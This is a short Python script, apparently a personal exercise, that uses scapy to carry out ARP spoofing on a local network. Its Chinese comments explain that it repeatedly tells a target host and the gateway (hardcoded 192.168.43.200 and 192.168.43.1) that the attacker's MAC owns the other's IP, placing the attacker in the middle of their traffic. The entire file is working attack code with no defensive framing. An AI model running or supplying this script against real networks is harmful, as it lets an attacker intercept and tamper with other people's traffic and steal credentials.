
from scapy.all import *

def get_mac_address():
    node = uuid.getnode()
    mac = uuid.UUID(int = node).hex[-12:]
    mac = re.sub(r"(?<=\w)(?=(?:\w\w)+$)", ":", mac)
    return mac
srcmac = get_mac_address()

def target(): # 发给目标机器，谎称攻击机mac的ip是网关ip，有发到网关ip的流量都会发到攻击机mac
    pk = Ether() / ARP(psrc='192.168.43.1', pdst='192.168.43.200')
    sendp(pk)
    pk.show()
    time.sleep(2)

def gateway(): # 发给网关，慌称攻击机的mac的ip是目标机ip，有发给目标机ip的流量都会发到攻击机mac
    pk = Ether() / ARP(psrc='192.168.43.200',pdst='192.168.43.1')
    sendp(pk)
    pk.show()
    time.sleep(3)

if __name__ == '__main__':
    while 1:
        target()
        gateway()


